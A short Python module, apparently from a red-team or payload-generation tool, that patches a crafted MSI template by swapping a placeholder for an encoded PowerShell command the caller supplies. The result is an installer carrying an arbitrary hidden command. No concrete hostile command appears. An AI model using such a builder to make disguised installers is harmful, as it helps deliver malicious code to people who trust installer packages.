import os
from .utils import *

path = os.path.dirname(__file__)

def msi_replace(msi, ps_command):
    return msi.replace(b'X'*256, ps_encode(ps_command.ljust(96)).encode('utf-8'))

def generate(ps_command):
    with open(os.path.join(path, f'templates/msi/craft.msi'), 'rb') as f:
        msi_file = f.read()
    return msi_replace(msi_file, ps_command)

